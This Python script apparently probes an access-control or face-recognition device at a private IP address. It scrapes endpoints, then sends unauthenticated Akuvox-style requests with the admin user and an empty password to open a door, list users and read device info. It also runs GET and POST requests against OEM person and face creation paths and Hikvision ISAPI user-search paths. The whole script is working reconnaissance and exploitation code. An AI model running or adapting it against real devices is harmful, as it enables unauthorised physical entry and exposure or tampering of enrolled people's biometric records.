import httpx
import re

base = "http://192.168.15.44"
c = httpx.Client(timeout=15, follow_redirects=True)

for path in [
    "/fcgi/do?id=1",
    "/fcgi/do?id=16",
    "/fcgi/do?id=5",
    "/fcgi/do?id=16&id=5",
]:
    r = c.get(base + path)
    text = r.content.decode("utf-8", "replace")
    print(path, r.status_code, "len", len(r.content), "ct", r.headers.get("content-type"))
    refs = set(re.findall(r"['\"]([^'\"]+\.(?:js|cgi|fcgi|json))['\"]", text, flags=re.I))
    apis = set(re.findall(r"/api/[A-Za-z0-9_./?-]+", text))
    print(" refs", sorted(refs)[:30])
    print(" apis", sorted(apis)[:30])
    print(" snippet", text[:400].replace("\n", " "))
    print("---")

# Akuvox-style door open / login
auth_q = {"UserName": "admin", "Password": ""}
for path in [
    "/fcgi/do?action=OpenDoor&UserName=admin&Password=&DoorNum=1",
    "/fcgi/do?action=listUser&UserName=admin&Password=",
    "/fcgi/do?action=getDeviceInfo&UserName=admin&Password=",
]:
    r = c.get(base + path)
    print("GET", path.split("?")[0], path[path.find("action=") : path.find("&")], r.status_code, r.content[:200])

# Basic auth deeper api paths used by some OEM facials
auth = ("admin", "")
c2 = httpx.Client(timeout=10, auth=auth)
candidates = [
    "/api/v1/person/find",
    "/api/v1/person/create",
    "/api/v1/face/create",
    "/api/person/find",
    "/api/persons",
    "/api/web/person/find",
    "/api/web/login",
    "/api/web/user/list",
    "/api/facerecognition/person/find",
    "/ISAPI/AccessControl/UserInfo/Search?format=json",
    "/ISAPI/System/deviceInfo",
]
for path in candidates:
    try:
        r = c2.get(base + path)
        print("GET", path, r.status_code, r.content[:160])
        r = c2.post(base + path, json={})
        print("POST", path, r.status_code, r.content[:160])
    except Exception as e:
        print(path, e)
